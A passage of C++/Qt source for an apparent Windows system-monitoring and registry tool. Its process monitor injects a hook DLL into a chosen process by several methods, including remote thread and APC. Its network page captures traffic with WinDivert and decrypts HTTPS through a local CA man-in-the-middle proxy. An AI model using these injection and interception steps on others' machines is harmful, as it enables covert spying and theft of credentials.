        Statuses[0]->setText("Stopped");
    }

    void HandleSystemWorkerExit()
    {
        if (SystemStopping)
            return;
        if (EtwThread.joinable())
            EtwThread.join();
        FinishSystemStop();
    }

    void StopSystem(bool ShowResult)
    {
        if (SystemStopping.exchange(true)) return;
        if (!SystemRunning.exchange(false) && !EtwThread.joinable() && !Kernel)
        {
            SystemStopping = false;
            return;
        }
        SystemStart->setEnabled(false); SystemStop->setEnabled(false); SystemMode->setEnabled(false);
        Statuses[0]->setText("Stopping...");
        QPointer<MonitorManagerPage> Page(this);
        std::thread EtwWorker = std::move(EtwThread);
        std::unique_ptr<KernelMonitorV2> KernelWorker = std::move(Kernel);
        std::thread([Page, EtwWorker = std::move(EtwWorker), KernelWorker = std::move(KernelWorker), ShowResult]() mutable {
            StopTrace();
            SetEtwEventCallback(nullptr);
            if (KernelWorker)
            {
                KernelWorker->Stop();
                KernelWorker.reset();
            }
            if (EtwWorker.joinable())
                EtwWorker.join();
            if (Page)
                QMetaObject::invokeMethod(Page, [Page, ShowResult] {
                    if (!Page) return;
                    Page->FinishSystemStop();
                    if (ShowResult) ShowSuccessNotice(Page, "Monitor", "System monitor stopped.");
                }, Qt::QueuedConnection);
        }).detach();
    }

    void StartProcess()
    {
        if (ProcessStopping || ProcessRunning) return;
        const QString Target = ProcessTarget->text().trimmed();
        DWORD Pid = Target.toUInt();
        if (!Pid) Pid = GetProcessIdByName(Target.toStdWString());
        if (!Pid) { ShowErrorNotice(this, "Monitor", "Process not found."); return; }
        Clear(1);
        const std::weak_ptr<MonitorSharedState> WeakState = SharedState;
        Dll = std::make_unique<DllMonitor>();
        Dll->SetCallback([WeakState, Target](const DllEvent &Event) {
            if (const auto State = WeakState.lock())
                PushMonitorEvent(State, 1, QString("%1 | PID %2 | TID %3 | Timestamp %4 | Target %5")
                    .arg(QString::fromStdString(Event.Category)).arg(Event.ProcessId).arg(Event.ThreadId)
                    .arg(Event.Timestamp).arg(Target));
        });
        if (!Dll->Start()) { Dll.reset(); ShowErrorNotice(this, "Monitor", "Failed to create monitor pipe."); return; }
        const std::filesystem::path DllPath = std::filesystem::path(QCoreApplication::applicationDirPath().toStdWString()) / L"ExtraDLL" / L"MonitorHook.dll";
        if (!std::filesystem::exists(DllPath)) { Dll->Stop(); Dll.reset(); ShowErrorNotice(this, "Monitor", "MonitorHook.dll was not found."); return; }
        EnableDebugPrivilege();
        BOOL Result = FALSE;
        switch (ProcessMethod->currentIndex())
        {
        case 0: Result = Inject_RemoteThread(Pid, DllPath.wstring()); break;
        case 1: Result = Inject_NtCreateThreadEx(Pid, DllPath.wstring()); break;
        case 2: Result = Inject_QueueUserAPC(Pid, DllPath.wstring()); break;
        case 3: Result = Inject_SetWindowsHookEx(Pid, DllPath.wstring()); break;
        case 4: Result = DllInjectApc(Pid, DllPath.wstring().c_str()); break;
        case 5: Result = DllInjectThread(Pid, DllPath.wstring().c_str()); break;
        }
        if (!Result) { Dll->Stop(); Dll.reset(); ShowErrorNotice(this, "Monitor", "MonitorHook.dll injection failed."); return; }
        ProcessRunning = true; ProcessTarget->setEnabled(false); ProcessMethod->setEnabled(false);
        ProcessStart->setEnabled(false); ProcessStop->setEnabled(true); Statuses[1]->setText(QString("Monitoring PID %1").arg(Pid));
        ShowSuccessNotice(this, "Monitor", "Process monitor started.");
    }

    void StopProcess(bool ShowResult)
    {
        if (ProcessStopping.exchange(true)) return;
        if (!ProcessRunning.exchange(false) && !Dll)
        {
            ProcessStopping = false;
            return;
        }
        ProcessStart->setEnabled(false); ProcessStop->setEnabled(false);
        ProcessTarget->setEnabled(false); ProcessMethod->setEnabled(false);
        Statuses[1]->setText("Stopping...");
        QPointer<MonitorManagerPage> Page(this);
        std::unique_ptr<DllMonitor> DllWorker = std::move(Dll);
        std::thread([Page, DllWorker = std::move(DllWorker), ShowResult]() mutable {
            if (DllWorker)
            {
                DllWorker->Stop();
                DllWorker.reset();
            }
            if (Page)
                QMetaObject::invokeMethod(Page, [Page, ShowResult] {
                    if (!Page) return;
                    Page->ProcessStopping = false;
                    Page->ProcessTarget->setEnabled(true); Page->ProcessMethod->setEnabled(true);
                    Page->ProcessStart->setEnabled(true); Page->ProcessStop->setEnabled(false);
                    Page->Statuses[1]->setText("Stopped");
                    if (ShowResult) ShowSuccessNotice(Page, "Monitor", "Process monitor stopped.");
                }, Qt::QueuedConnection);
        }).detach();
    }

    std::filesystem::path ExtraDllPath() const
    {
        return std::filesystem::path(QCoreApplication::applicationDirPath().toStdWString()) / L"ExtraDLL";
    }

    void StartNetwork()
    {
        if (NetworkRunning) return;
        if (HttpRunning) { ShowWarningNotice(this, "Monitor", "Stop HTTP(S) capture before starting Network capture."); return; }
        Clear(2);
        const std::filesystem::path Directory = ExtraDllPath();
        if (!NetMon_LoadWinDivertDllFromDirectory(Directory.c_str())) { ShowErrorNotice(this, "Monitor", QString("Unable to load WinDivert.dll (error %1).").arg(GetLastError())); return; }
        if (!NetMon_IsWinDivertDriverRunning()) { ShowErrorNotice(this, "Monitor", QString("WinDivert driver is not running (error %1).").arg(GetLastError())); return; }
        if (!NetMon_Start(MonitorNetworkCallback)) { ShowErrorNotice(this, "Monitor", QString("Network capture failed (error %1).").arg(GetLastError())); return; }
        NetworkRunning = true; NetworkStart->setEnabled(false); NetworkStop->setEnabled(true); Statuses[2]->setText("WinDivert network capture running");
        ShowSuccessNotice(this, "Monitor", "Network capture started.");
    }

    void StopNetwork(bool ShowResult)
    {
        if (!NetworkRunning.exchange(false)) return;
        NetMon_Stop(); NetworkStart->setEnabled(true); NetworkStop->setEnabled(false); Statuses[2]->setText("Stopped");
        if (ShowResult) ShowSuccessNotice(this, "Monitor", "Network capture stopped.");
    }

    static QString HttpAddress(uint32_t Address)
    {
        return QString("%1.%2.%3.%4").arg((Address >> 24) & 0xFF).arg((Address >> 16) & 0xFF)
            .arg((Address >> 8) & 0xFF).arg(Address & 0xFF);
    }

    uint16_t CurrentHttpProxyPort() const
    {
        bool Ok = false;
        const int Port = HttpProxyPort ? HttpProxyPort->text().trimmed().toInt(&Ok) : 0;
        return Ok && Port >= 1 && Port <= 65535 ? static_cast<uint16_t>(Port) : 0;
    }

    QString HttpProxyStatusText(const QString &Prefix) const
    {
        const uint16_t Port = CurrentHttpProxyPort();
        return Port == 0 ? Prefix : QString("%1 | HTTPS proxy 127.0.0.1:%2").arg(Prefix).arg(Port);
    }

    void StartHttp()
    {
        if (HttpRunning) return;
        if (NetworkRunning) { ShowWarningNotice(this, "Monitor", "Stop Network capture before starting HTTP(S) capture."); return; }
        const uint16_t ProxyPort = CurrentHttpProxyPort();
        if (ProxyPort == 0) { ShowErrorNotice(this, "Monitor", "Proxy port must be between 1 and 65535."); return; }
        Clear(3);
        const std::filesystem::path ExecutableDirectory(QCoreApplication::applicationDirPath().toStdWString());
        http_capture::Config Config;
        Config.CaptureHttp = true; Config.CaptureHttps = true; Config.HttpsMitm = true;
        Config.ProxyPort = ProxyPort;
        Config.WinDivertDllPath = (ExecutableDirectory / L"ExtraDLL" / L"WinDivert.dll").string();
        Config.CaCertPath = (ExecutableDirectory / L"Data" / L"CA_CERT.pem").string();
        Config.CaKeyPath = (ExecutableDirectory / L"Data" / L"CA_KEY.pem").string();
        Http = std::make_unique<http_capture::HttpCapture>(Config);
        const std::weak_ptr<MonitorSharedState> WeakState = SharedState;
        Http->OnHttpRequest([WeakState](const http_capture::FlowInfo &Flow, const http_capture::HttpRequest &Request) {
            if (const auto State = WeakState.lock())
            {
                const QString Host = Request.Host.empty() ? HttpAddress(Flow.DstIp) : QString::fromStdString(Request.Host);
                const QString Text = QString("HTTP REQUEST | %1 %2%3 | %4:%5 -> %6:%7 | %8 bytes")
                    .arg(QString::fromStdString(Request.Method), Host, QString::fromStdString(Request.Url), HttpAddress(Flow.SrcIp))
                    .arg(Flow.SrcPort).arg(HttpAddress(Flow.DstIp)).arg(Flow.DstPort).arg(Request.Body.size());
                QString Detail = Text + "\n\nHeaders:\n";
                for (const auto &Header : Request.Headers) Detail += QString::fromStdString(Header.Name + ": " + Header.Value + "\n");
                Detail += "\nBody:\n" + QString::fromUtf8(reinterpret_cast<const char *>(Request.Body.data()), static_cast<qsizetype>(Request.Body.size()));
                PushMonitorEvent(State, 3, Text, Detail);
            }
        });
        Http->OnHttpResponse([WeakState](const http_capture::FlowInfo &Flow, const http_capture::HttpResponse &Response) {
            if (const auto State = WeakState.lock())
            {
                const QString Text = QString("HTTP RESPONSE | %1 %2 | %3:%4 -> %5:%6 | %7 bytes")
                    .arg(Response.StatusCode).arg(QString::fromStdString(Response.Reason), HttpAddress(Flow.SrcIp))
                    .arg(Flow.SrcPort).arg(HttpAddress(Flow.DstIp)).arg(Flow.DstPort).arg(Response.Body.size());
                QString Detail = Text + "\n\nHeaders:\n";
                for (const auto &Header : Response.Headers) Detail += QString::fromStdString(Header.Name + ": " + Header.Value + "\n");
                Detail += "\nBody:\n" + QString::fromUtf8(reinterpret_cast<const char *>(Response.Body.data()), static_cast<qsizetype>(Response.Body.size()));
                PushMonitorEvent(State, 3, Text, Detail);
            }
        });
        Http->OnTlsSni([WeakState](const http_capture::FlowInfo &Flow, const http_capture::TlsSniInfo &Sni) {
            if (const auto State = WeakState.lock())
            {
                const QString Text = QString("HTTPS SNI | %1 | %2:%3 -> %4:%5")
                    .arg(QString::fromStdString(Sni.ServerName), HttpAddress(Flow.SrcIp)).arg(Flow.SrcPort)
                    .arg(HttpAddress(Flow.DstIp)).arg(Flow.DstPort);
                PushMonitorEvent(State, 3, Text, Text + QString("\nTLS version: %1\nClientHello: %2 bytes").arg(Sni.TlsVersion).arg(Sni.RawClientHello.size()));
            }
        });
        if (!Http->Start()) {
            const QString Error = QString::fromStdString(Http->LastError());
            Http.reset();
            const QString Message = Error.isEmpty() ? "HTTP(S) capture failed to start."
                : "HTTP(S) capture failed to start.\n" + Error;
            Statuses[3]->setText("Start failed");
            ShowErrorNotice(this, "Monitor", Message);
            return;
        }
        HttpRunning = true; HttpStart->setEnabled(false); HttpStop->setEnabled(true); HttpProxyPort->setEnabled(false); Statuses[3]->setText(HttpProxyStatusText("HTTP(S) capture running"));
        ShowSuccessNotice(this, "Monitor", "HTTP(S) capture started.");
    }

    void StopHttp(bool ShowResult)
    {
        if (Http) { Http->Stop(); Http.reset(); }
        if (!HttpRunning.exchange(false)) return;
        HttpStart->setEnabled(true); HttpStop->setEnabled(false); HttpProxyPort->setEnabled(true); Statuses[3]->setText(HttpProxyStatusText("Stopped"));
        if (ShowResult) ShowSuccessNotice(this, "Monitor", "HTTP(S) capture stopped.");
    }

    std::shared_ptr<MonitorSharedState> SharedState;
    QStackedWidget *Pages = nullptr;
    std::array<SearchLineEdit *, 4> Searches{};
    std::array<TableWidget *, 4> Tables{};
    std::array<BodyLabel *, 4> Statuses{};
    std::array<uint64_t, 4> DisplayedVersions{};
    uint64_t DisplayedHistoryVersion = 0;
    QTimer *UpdateTimer = nullptr;

    SearchLineEdit *HistorySearchEdit = nullptr;
    TableWidget *HistoryTable = nullptr;
    BodyLabel *HistoryStatus = nullptr;
    void PopulateHistory(const QString &Query)
    {
        if (!HistoryTable)
            return;
        std::vector<MonitorHistoryRow> HistoryRows;
        {
            std::lock_guard<std::mutex> Lock(SharedState->HistoryMutex);
            HistoryRows = SharedState->HistoryRows;
        }
        HistoryTable->clearContents();
        HistoryTable->setRowCount(0);
        for (const auto &Evt : HistoryRows)
        {
            if (!Query.isEmpty() && !Evt.Type.contains(Query, Qt::CaseInsensitive) &&
                !Evt.Process.contains(Query, Qt::CaseInsensitive) &&
                !Evt.Detail.contains(Query, Qt::CaseInsensitive) &&
                !QString::number(Evt.Pid).contains(Query))
                continue;
            int R = HistoryTable->rowCount();
            HistoryTable->insertRow(R);
            HistoryTable->setItem(R, 0, new QTableWidgetItem(Evt.Timestamp));
            HistoryTable->setItem(R, 1, new QTableWidgetItem(Evt.Type));
            HistoryTable->setItem(R, 2, new QTableWidgetItem(QString::number(Evt.Pid)));
            HistoryTable->setItem(R, 3, new QTableWidgetItem(Evt.Process));
            HistoryTable->setItem(R, 4, new QTableWidgetItem(Evt.Detail));
            HistoryTable->setRowHeight(R, 38);
        }
        HistoryStatus->setText(QString("Events: %1").arg(HistoryRows.size()));
    }

    ComboBox *SystemMode = nullptr; PushButton *SystemStart = nullptr; PushButton *SystemStop = nullptr;
    LineEdit *SystemFilterPid = nullptr; LineEdit *SystemPathPrefix = nullptr; CheckBox *RegistryPreview = nullptr;
    LineEdit *ProcessTarget = nullptr; ComboBox *ProcessMethod = nullptr; PushButton *ProcessStart = nullptr; PushButton *ProcessStop = nullptr;
    PushButton *NetworkStart = nullptr; PushButton *NetworkStop = nullptr;
    LineEdit *HttpProxyPort = nullptr;
    PushButton *HttpStart = nullptr; PushButton *HttpStop = nullptr;
    std::unique_ptr<KernelMonitorV2> Kernel;
    std::unique_ptr<DllMonitor> Dll;
    std::unique_ptr<http_capture::HttpCapture> Http;
    std::thread EtwThread;
    std::atomic_bool SystemRunning = false;
    std::atomic_bool SystemStopping = false;
    std::atomic_bool ProcessRunning = false;
    std::atomic_bool ProcessStopping = false;
    std::atomic_bool NetworkRunning = false;
    std::atomic_bool HttpRunning = false;

  protected:
    void showEvent(QShowEvent *Event) override
    {
        QWidget::showEvent(Event);
        const int Index = Pages->currentIndex();
        if (Index >= 0 && Index < 4)
        {
            DisplayedVersions[Index] = SharedState->Streams[Index].Version.load(std::memory_order_relaxed);
            Populate(Index);
        }
    }
};

QWidget *CreateMonitorPage()
{
    return new MonitorManagerPage;
}

class RegistryManagerPage final : public QWidget
{
    struct RegistryLocation
    {
        HKEY Root = nullptr;
        QString RootName;
        QString SubKey;
    };

    struct RegistryValueRow
    {
        QString RootName;
        QString KeyPath;
        QString Location;
        QString Name;
        QString Data;
        DWORD Type = REG_NONE;
    };

    struct ProtectedRegistryEntry
    {
        QString DisplayPath;
        QString KernelPath;
    };

  public:
    explicit RegistryManagerPage(QWidget *Parent = nullptr) : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout, 10);

        auto *Tabs = new TabBar;
        Tabs->setAddButtonVisible(false);
        Tabs->setTabsClosable(false);
        Tabs->setMovable(false);
        Tabs->addTab("registry", "Browser", Fluent::IconType::DOCUMENT);
        Tabs->addTab("protected", "Protected", Fluent::IconType::CERTIFICATE);
        Layout->addWidget(Tabs);

        auto *Pages = new QStackedWidget;
        Pages->addWidget(CreateRegistryBrowser());
        Pages->addWidget(CreateProtectedPage());
        Layout->addWidget(Pages, 1);
        QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
        RefreshValues();
    }

  private:
    QWidget *CreateRegistryBrowser()
    {
        auto *Page = new QWidget;
        auto *Layout = new QVBoxLayout(Page);
        ConfigurePageLayout(Layout, 10);

        auto *ScopeLayout = new QHBoxLayout;
        ConfigureToolbarLayout(ScopeLayout);
        SourceCombo = new ComboBox;
        SourceCombo->addItems({"Startup items", "Image hijacks", "Selected path"});
        SourceCombo->setCurrentIndex(0);
        SourceCombo->setMinimumWidth(190);
        PathCombo = new ComboBox;
        PathCombo->setMinimumWidth(300);
        const auto AddPathOption = [this](const QString &Label, const QString &Path) {
            PathCombo->addItem(Label, Path);
        };
        AddPathOption("Current user | Run", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        AddPathOption("Current user | RunOnce", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
        AddPathOption("Current user | RunServices", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices");
        AddPathOption("Current user | Explorer policy", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
        PathCombo->insertSeparator(PathCombo->count());
        AddPathOption("All users | Run", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        AddPathOption("All users | RunOnce", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
        AddPathOption("All users | RunServices", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices");
        AddPathOption("All users | Explorer policy", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run");
        PathCombo->insertSeparator(PathCombo->count());
        AddPathOption("Default user | Run", "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        AddPathOption("Winlogon", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
        PathCombo->setCurrentIndex(0);
        ValueCountLabel = new BodyLabel("0 values");
        ValueCountLabel->setAlignment(Qt::AlignRight | Qt::AlignVCenter);
        ScopeLayout->addWidget(SourceCombo);
        ScopeLayout->addWidget(PathCombo, 1);
        ScopeLayout->addWidget(ValueCountLabel);
        Layout->addLayout(ScopeLayout);

        auto *AddressLayout = new QHBoxLayout;
        ConfigureToolbarLayout(AddressLayout);
        AddressEdit = new LineEdit;
        AddressEdit->setPlaceholderText("HKLM\\Software\\... or \\Registry\\Machine\\...");
        auto *BrowseButton = new PushButton("Browse", Fluent::IconType::FOLDER);
        auto *RefreshButton = new ToolButton(Fluent::IconType::SYNC);
        RefreshButton->setFixedSize(36, 36);
        RefreshButton->setToolTip("Refresh");
        auto *ProtectButton = new PushButton("Protect", Fluent::IconType::CERTIFICATE);
        AddressLayout->addWidget(AddressEdit, 1);
        AddressLayout->addWidget(BrowseButton);
        AddressLayout->addWidget(RefreshButton);
        AddressLayout->addWidget(ProtectButton);
        Layout->addLayout(AddressLayout);

        auto *ActionLayout = new QHBoxLayout;
        ConfigureToolbarLayout(ActionLayout);
        SearchEdit = new SearchLineEdit;
        SearchEdit->setPlaceholderText("Search key, value name, type, or data");
        SearchEdit->setClearButtonEnabled(true);
        SearchEdit->setMaximumWidth(420);
        auto *NewKeyButton = new PushButton("New key", Fluent::IconType::FOLDER_ADD);
        auto *NewValueButton = new PushButton("New value", Fluent::IconType::DOCUMENT);
        ModifyButton = new PushButton("Modify", Fluent::IconType::CODE);
        DeleteButton = MakeButton("Delete");
        ModifyButton->setEnabled(false);
        DeleteButton->setEnabled(false);
        ActionLayout->addWidget(SearchEdit, 1);
        ActionLayout->addWidget(NewKeyButton);
        ActionLayout->addWidget(NewValueButton);
        ActionLayout->addWidget(ModifyButton);
        ActionLayout->addWidget(DeleteButton);
        Layout->addLayout(ActionLayout);

        ValueTable = MakeTable({"Location", "Registry path", "Value name", "Type", "Data"});
        ValueTable->setSelectionMode(QAbstractItemView::SingleSelection);
        ValueTable->setProperty("UseGenericDetailDialog", false);
        ValueTable->setSortingEnabled(true);
        ValueTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        ValueTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        ValueTable->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        ValueTable->horizontalHeader()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
        ValueTable->horizontalHeader()->setSectionResizeMode(4, QHeaderView::Stretch);
        Layout->addWidget(ValueTable, 1);

        QObject::connect(SourceCombo, &ComboBox::currentIndexChanged, this, [this](int Index) {
            PathCombo->setEnabled(Index == 0);
            if (Index < 2)
            {
                if (Index == 0)
                {
                    const QSignalBlocker PathBlocker(PathCombo);
                    PathCombo->setCurrentIndex(0);
                }
                AddressEdit->setText(Index == 0
                    ? "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    : "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options");
            }
            RefreshValues();
        });
        QObject::connect(PathCombo, &ComboBox::currentIndexChanged, this, [this](int Index) {
            const QString Path = PathCombo->itemData(Index).toString();
            if (Path.isEmpty())
                return;
            AddressEdit->setText(Path);
            const QSignalBlocker Blocker(SourceCombo);
            SourceCombo->setCurrentIndex(0);
            RefreshValues();
        });
        QObject::connect(BrowseButton, &QPushButton::clicked, this,
                         [this] { ShowRegistryPathDialog(); });
        QObject::connect(AddressEdit, &QLineEdit::returnPressed, this, [this] {
            const QSignalBlocker Blocker(SourceCombo);
            SourceCombo->setCurrentIndex(2);
            RefreshValues();
        });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] {
            RefreshValues();
            ShowSuccessNotice(this, "Registry", "Registry values refreshed.");
        });
        QObject::connect(ProtectButton, &QPushButton::clicked, this, [this] { ProtectAddress(); });
        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this] { PopulateValues(); });
        QObject::connect(NewKeyButton, &QPushButton::clicked, this, [this] { ShowCreateKeyDialog(); });
        QObject::connect(NewValueButton, &QPushButton::clicked, this, [this] { ShowValueDialog(false); });
        QObject::connect(ModifyButton, &QPushButton::clicked, this, [this] { ShowValueDialog(true); });
        QObject::connect(DeleteButton, &QPushButton::clicked, this, [this] { DeleteSelectedValue(); });
        QObject::connect(ValueTable, &QTableWidget::itemSelectionChanged, this, [this] {
            const bool Selected = SelectedValue() != nullptr;
            ModifyButton->setEnabled(Selected);
            DeleteButton->setEnabled(Selected);
            if (const RegistryValueRow *Row = SelectedValue())
                AddressEdit->setText(Row->RootName + "\\" + Row->KeyPath);
        });
        QObject::connect(ValueTable, &QTableWidget::cellDoubleClicked, this,
                         [this](int, int) { ShowValueDialog(true); });
        AddressEdit->setText("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        return Page;
    }

    QWidget *CreateProtectedPage()
    {
        auto *Page = new QWidget;
        auto *Layout = new QVBoxLayout(Page);
        ConfigurePageLayout(Layout, 10);
        auto *Toolbar = new QHBoxLayout;
        ConfigureToolbarLayout(Toolbar);
        ProtectedSearchEdit = new SearchLineEdit;
        ProtectedSearchEdit->setPlaceholderText("Search protected paths");
        ProtectedSearchEdit->setClearButtonEnabled(true);
        ProtectedSearchEdit->setMaximumWidth(420);
        ProtectedCountLabel = new BodyLabel("0 paths");
        UnprotectButton = new PushButton("Unprotect", Fluent::IconType::CERTIFICATE);
        UnprotectButton->setEnabled(false);
        Toolbar->addWidget(ProtectedSearchEdit, 1);
        Toolbar->addWidget(ProtectedCountLabel);
        Toolbar->addWidget(UnprotectButton);
        Layout->addLayout(Toolbar);
        ProtectedTable = MakeTable({"Registry path", "Kernel path"});
        ProtectedTable->setSelectionMode(QAbstractItemView::ExtendedSelection);
        ProtectedTable->setProperty("DetailDialogTitle", "Registry details");
        ProtectedTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        ProtectedTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        Layout->addWidget(ProtectedTable, 1);
        QObject::connect(ProtectedTable, &QTableWidget::itemSelectionChanged, this, [this] {
            UnprotectButton->setEnabled(!ProtectedTable->selectionModel()->selectedRows(0).isEmpty());
        });
        QObject::connect(ProtectedSearchEdit, &QLineEdit::textChanged, this, [this] { RefreshProtectedTable(); });
        QObject::connect(UnprotectButton, &QPushButton::clicked, this, [this] { UnprotectSelection(); });
        return Page;
    }

    bool ParseLocation(const QString &Text, RegistryLocation &Location) const
    {
        QString Path = QDir::fromNativeSeparators(Text.trimmed()).replace('/', '\\');
        while (Path.startsWith('\\')) Path.remove(0, 1);
        const std::array<std::tuple<const char *, const char *, HKEY>, 10> Roots{{
            {"HKEY_LOCAL_MACHINE", "HKLM", HKEY_LOCAL_MACHINE}, {"HKLM", "HKLM", HKEY_LOCAL_MACHINE},
            {"HKEY_CURRENT_USER", "HKCU", HKEY_CURRENT_USER}, {"HKCU", "HKCU", HKEY_CURRENT_USER},
            {"HKEY_USERS", "HKU", HKEY_USERS}, {"HKU", "HKU", HKEY_USERS},
            {"HKEY_CLASSES_ROOT", "HKCR", HKEY_CLASSES_ROOT}, {"HKCR", "HKCR", HKEY_CLASSES_ROOT},
            {"HKEY_CURRENT_CONFIG", "HKCC", HKEY_CURRENT_CONFIG}, {"HKCC", "HKCC", HKEY_CURRENT_CONFIG}}};
        for (const auto &[LongName, ShortName, Root] : Roots)
        {
            const QString Prefix = QString::fromLatin1(LongName);
            if (Path.compare(Prefix, Qt::CaseInsensitive) == 0 ||
                Path.startsWith(Prefix + "\\", Qt::CaseInsensitive))
            {
                Location.Root = Root;
                Location.RootName = QString::fromLatin1(ShortName);
                Location.SubKey = Path.mid(Prefix.size());
                while (Location.SubKey.startsWith('\\')) Location.SubKey.remove(0, 1);
                return true;
            }
        }
        return false;
    }

    static QString TypeName(DWORD Type)
    {
        switch (Type)
        {
        case REG_SZ: return "REG_SZ";
        case REG_EXPAND_SZ: return "REG_EXPAND_SZ";
        case REG_DWORD: return "REG_DWORD";
        case REG_QWORD: return "REG_QWORD";
        case REG_MULTI_SZ: return "REG_MULTI_SZ";
        case REG_BINARY: return "REG_BINARY";
        case REG_NONE: return "REG_NONE";
        default: return QString("REG_%1").arg(Type);
        }
    }

    static QString ValueDataText(DWORD Type, const std::vector<BYTE> &Data)
    {
        if ((Type == REG_SZ || Type == REG_EXPAND_SZ) && Data.size() >= sizeof(wchar_t))
        {
            QString Value = QString::fromWCharArray(reinterpret_cast<const wchar_t *>(Data.data()),
                                                    static_cast<qsizetype>(Data.size() / sizeof(wchar_t)));
            while (Value.endsWith(QChar::Null)) Value.chop(1);
            return Value;
        }
        if (Type == REG_DWORD && Data.size() >= sizeof(DWORD))
        {
            DWORD Value = 0; std::memcpy(&Value, Data.data(), sizeof(Value));
            return QString("%1 (0x%2)").arg(Value).arg(Value, 8, 16, QLatin1Char('0')).toUpper();
        }
        if (Type == REG_QWORD && Data.size() >= sizeof(ULONGLONG))
        {
            ULONGLONG Value = 0; std::memcpy(&Value, Data.data(), sizeof(Value));
            return QString("%1 (0x%2)").arg(Value).arg(Value, 16, 16, QLatin1Char('0')).toUpper();
        }
        if (Type == REG_MULTI_SZ && Data.size() >= sizeof(wchar_t))
        {
            QStringList Values;
            const wchar_t *Current = reinterpret_cast<const wchar_t *>(Data.data());
            const wchar_t *End = Current + Data.size() / sizeof(wchar_t);
            while (Current < End && *Current)
            {
                const size_t Length = wcsnlen_s(Current, static_cast<size_t>(End - Current));
                Values.append(QString::fromWCharArray(Current, static_cast<qsizetype>(Length)));
                Current += Length + 1;
            }
            return Values.join(" | ");
        }
        QStringList Bytes;
        for (BYTE Value : Data) Bytes.append(QString("%1").arg(Value, 2, 16, QLatin1Char('0')).toUpper());
        return Bytes.join(' ');
    }

    void ShowRegistryPathDialog()
    {
        QDialog Dialog(this);
        Dialog.setWindowTitle("Select registry path");
        Dialog.resize(1040, 680);

        auto *Layout = new QVBoxLayout(&Dialog);
        auto *PathLabel = MakeLabel("Computer", 11, KTextMuted);
        PathLabel->setTextInteractionFlags(Qt::TextSelectableByMouse);
        Layout->addWidget(PathLabel);

        auto *Splitter = new QSplitter;
        Splitter->setChildrenCollapsible(false);
        auto *KeyTree = new QTreeWidget;
        KeyTree->setHeaderLabel("Computer");
        KeyTree->setAnimated(true);
        KeyTree->setMinimumWidth(330);
        InstallFluentScrollBar(KeyTree, Qt::Vertical);
        auto *Values = MakeTable({"Name", "Type", "Data"});
        Values->setSelectionMode(QAbstractItemView::SingleSelection);
        Values->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        Values->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        Values->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
        Splitter->addWidget(KeyTree);
        Splitter->addWidget(Values);
        Splitter->setStretchFactor(0, 0);
        Splitter->setStretchFactor(1, 1);
        Splitter->setSizes({360, 680});
        Layout->addWidget(Splitter, 1);

        auto *Buttons = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel);
        Buttons->button(QDialogButtonBox::Ok)->setText("Select");
        Buttons->button(QDialogButtonBox::Ok)->setEnabled(false);
        Layout->addWidget(Buttons);

        const std::array<HKEY, 5> Roots{HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE,
                                        HKEY_USERS, HKEY_CURRENT_CONFIG};
        const std::array<QString, 5> RootNames{"HKCR", "HKCU", "HKLM", "HKU", "HKCC"};
        constexpr int RootRole = Qt::UserRole;
        constexpr int PathRole = Qt::UserRole + 1;
        constexpr int LoadedRole = Qt::UserRole + 2;
        constexpr int PlaceholderRole = Qt::UserRole + 3;

        const auto AddPlaceholder = [PlaceholderRole](QTreeWidgetItem *Parent) {
            auto *Placeholder = new QTreeWidgetItem(Parent, QStringList{"Loading..."});
            Placeholder->setData(0, PlaceholderRole, true);
        };

        std::function<void(QTreeWidgetItem *)> LoadChildren;
        LoadChildren = [&, AddPlaceholder](QTreeWidgetItem *Parent) {
            if (!Parent || Parent->data(0, LoadedRole).toBool())
                return;
            Parent->setData(0, LoadedRole, true);
            while (Parent->childCount() > 0)
                delete Parent->takeChild(0);

            const int RootIndex = Parent->data(0, RootRole).toInt();
            if (RootIndex < 0 || RootIndex >= static_cast<int>(Roots.size()))
                return;
            const QString ParentPath = Parent->data(0, PathRole).toString();
            HKEY Key = nullptr;
            const LSTATUS OpenStatus = RegOpenKeyExW(
                Roots[RootIndex], reinterpret_cast<LPCWSTR>(ParentPath.utf16()), 0,
                KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_WOW64_64KEY, &Key);
            if (OpenStatus != ERROR_SUCCESS)
                return;

            DWORD SubKeyCount = 0;
            DWORD MaximumNameLength = 0;
            RegQueryInfoKeyW(Key, nullptr, nullptr, nullptr, &SubKeyCount, &MaximumNameLength,
                             nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
            std::vector<wchar_t> Name(static_cast<size_t>(MaximumNameLength) + 2);
